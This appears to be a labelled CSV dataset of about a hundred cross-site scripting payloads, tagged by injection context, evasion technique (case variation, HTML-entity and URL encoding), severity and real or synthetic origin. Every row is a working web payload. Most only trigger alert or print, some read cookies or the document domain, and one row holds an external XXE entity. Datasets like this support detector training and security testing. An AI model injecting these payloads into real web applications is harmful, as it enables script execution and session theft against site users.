payload,context,technique,severity,length,source
"<img src=x onerror=\x00""javascript:alert(1)"">",event_handler,none,medium,45,real
"<IFRAME SRC='f' onerror='alert(1)'></IFRAME>""-prompt(8)-""",event_handler,case_variation,medium,57,real
<svg onb&#101;gin=&#97;l&#101;rt(1)>,tag_injection,synthetic,medium,36,synthetic
<p onpointerleave=alert(1) style=display:block>AnonKryptiQuz</p>,event_handler,none,medium,64,real
"<scRipT>//alErt(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection,synthetic,medium,55,synthetic
"<em onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</em>",event_handler,none,medium,63,real
<span onpointermove=alert(1) style=display:block>AnonKryptiQuz</span>,event_handler,none,medium,69,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style=""position:absolute;"" onanimationcancel=""print()""></template>",event_handler,none,low,185,real
<listing onpointerdown=alert(1) style=display:block>AnonKryptiQuz</listing>,event_handler,none,medium,75,real
""" onmouseenter=confirm(document.cookie) """,attribute_escape,synthetic,medium,41,synthetic
<caption onpointerout=alert(1) style=display:block>AnonKryptiQuz</caption>,event_handler,none,medium,74,real
"<aside onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</aside>",event_handler,none,medium,66,real
<base id=x tabindex=1 onactivate=alert(1)></base>,event_handler,none,medium,49,real
<svg onb&#101;gin=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,52,synthetic
""" oNerRor=coNsoLe.Log(loCatIon.haSh) """,attribute_escape,synthetic,medium,38,synthetic
"<style>:target {color:red;}</style><s id=x style=""transition:color 1s"" ontransitionstart=alert(1)></s>",event_handler,none,medium,102,real
"<applet onError applet onError=""javascript:javascript:alert(9815)""></applet onError>",event_handler,none,medium,84,real
"<caption ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,95,real
"""%3E%3Csvg onerror=console.log(document.domain)%3E",tag_injection,synthetic,medium,50,synthetic
"<style>:target {color:red;}</style><marquee id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></marquee>",event_handler,none,medium,118,real
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",event_handler,none,medium,113,real
"<textarea draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",event_handler,none,medium,89,real
%3Cscript%3Ealert(document.domain)%3C/script%3E,script_injection,synthetic,medium,47,synthetic
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></strike>",event_handler,none,medium,105,real
<video/poster/onerror=alert()>,event_handler,none,medium,30,real
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationend=""alert(1)""></time>",event_handler,none,medium,93,real
<pre id=x tabindex=1 onfocus=alert(1)></pre>,event_handler,none,medium,44,real
"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/AnonKryptiQuz.xxe"">]><y>&x;</y>//[""'`-->]]>]</div><div id=""65""><svg onload=""javascript:alert(65)"" xmlns=""http://www.w3.org/2000/svg""></svg>//[""'`-->]]>]</div>",event_handler,none,medium,222,real
<br onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<u draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,80,real
"<DIV STYLE=""width: expression(alert(1355));"">",attribute_escape,case_variation,medium,45,real
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(4459)')()</script>",script_injection,none,medium,101,real
"<bgsound oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",event_handler,none,medium,66,real
"EvaL(""ConFirM(STriNg.FroMChArCOde(88,83,83))"")",dom_sink,synthetic,medium,46,synthetic
"setTimeout(""confirm(1)"",0)",dom_sink,synthetic,medium,26,synthetic
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></em>",event_handler,none,medium,164,real
<shadow onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</shadow><input value=clickme>,event_handler,none,medium,112,real
"<li onmouseout=""alert(1)"">AnonKryptiQuz</li>",event_handler,none,medium,44,real
"""><svg onb&#101;gin=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,64,synthetic
"/</title/'/</style/</script/--><p"" onclick=alert()//>*/alert()/*",event_handler,none,medium,64,real
"<u oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</u>",event_handler,none,medium,54,real
<svg onfocus=console.log(document.domain)>,tag_injection,synthetic,medium,42,synthetic
"<rb onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,63,real
<label onpointermove=alert(1) style=display:block>AnonKryptiQuz</label>,event_handler,none,medium,71,real
"{{'a'.constructor.prototype.charAt=''.valueOf;$eval(""x='\""+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\""'"");}}",template_injection,unicode_escape|encoding,high,124,real
"<br onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</br>",event_handler,none,medium,64,real
"<summary draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</summary>",event_handler,none,medium,72,real
"<wbr onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</wbr>",event_handler,none,medium,59,real
"""><img src=""x"" onerror=""prompt(document.domain);"">",event_handler,none,medium,50,real
' oNfoCus=prOmpT(dOcuMenT.dOmaIn) ',attribute_escape,synthetic,medium,35,synthetic
"<style onmouseout=""alert(1)"">AnonKryptiQuz</style>",event_handler,none,medium,50,real
<applet onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</applet>,event_handler,none,medium,78,real
"<colgroup draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",event_handler,none,medium,94,real
"<optgroup onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</optgroup>",event_handler,none,medium,89,real
<tr onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,64,real
<col onpointerup=alert(1) style=display:block>AnonKryptiQuz</col>,event_handler,none,medium,65,real
%3cscript%3ealert%281%29%3b%3c%2fscript%3e,generic,url_encoding,low,42,real
�scriptualert(EAnonKryptiQuzE)�/scriptu,generic,none,medium,39,real
""" onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,71,synthetic
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=print()></strong>",event_handler,none,low,114,real
%3Csvg onmouseenter=console.log(1)%3E,tag_injection,synthetic,medium,37,synthetic
<rt onpointermove=alert(1) style=display:block>AnonKryptiQuz</rt>,event_handler,none,medium,65,real
<q onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,63,real
%3Csvg onclick=alert('XSS')%3E,tag_injection,synthetic,medium,30,synthetic
' oNclIck=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,40,synthetic
""" onmouseover=confirm(document.domain) """,attribute_escape,synthetic,medium,40,synthetic
"<div draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</div>",event_handler,none,medium,84,real
"<div onpointerout=""alert(45)"">MOVE HERE</div>",event_handler,none,medium,45,real
<img onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,65,real
"<frame draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</frame>",event_handler,none,medium,68,real
"<applet onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",event_handler,none,medium,73,real
"<noframes onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",event_handler,none,medium,69,real
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,event_handler,none,medium,82,real
"<rp draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</rp>",event_handler,none,medium,77,real
"<del onclick=""alert(1)"" style=display:block>AnonKryptiQuz</del>",event_handler,none,medium,63,real
<svg/onload=alert(1)>//INJECTX,event_handler,none,medium,30,real
<button popovertarget=x>Click me</button><datalist onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</datalist>,event_handler,none,medium,112,real
"<style>:target {transform: rotate(180deg);}</style><link id=x style=""transition:transform 2s"" ontransitionrun=print()></link>",event_handler,none,low,125,real
<svg onload=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,32,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""print()""></frame>",event_handler,none,low,179,real
"<legend onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</legend>",event_handler,none,medium,88,real
<menuitem onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,59,real
"<li draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</li>",event_handler,none,medium,77,real
<var id=x tabindex=1 onfocus=alert(1)></var>,event_handler,none,medium,44,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image3 id=x style=""position:absolute;"" onanimationcancel=""print()""></image3>",event_handler,none,low,181,real
<del onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</del>,event_handler,none,medium,72,real
<svG oNerRor=alErt('XSS')/>,tag_injection,synthetic,medium,27,synthetic
%22%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E,generic,url_encoding,low,138,real
"<content id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></content>",event_handler,none,medium,90,real
<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>,event_handler,none,medium,66,real
<animate onpointerdown=alert(1) style=display:block>AnonKryptiQuz</animate>,event_handler,none,medium,75,real
<svg><option onload=alert(1)></option>,event_handler,none,medium,38,real
%27 onmouseenter=confirm(document.domain) %27,attribute_escape,synthetic,medium,45,synthetic
"<ruby onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</ruby>",event_handler,none,medium,69,real
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,js_uri,case_variation,medium,51,real
%253cscript%253ealert(document.cookie)%253c/script%253e,dom_sink,url_encoding,high,55,real
"<svg onload=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,54,synthetic
"<video onmouseup=""alert(1)"">AnonKryptiQuz</video>",event_handler,none,medium,49,real
"<nextid onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",event_handler,none,medium,74,real
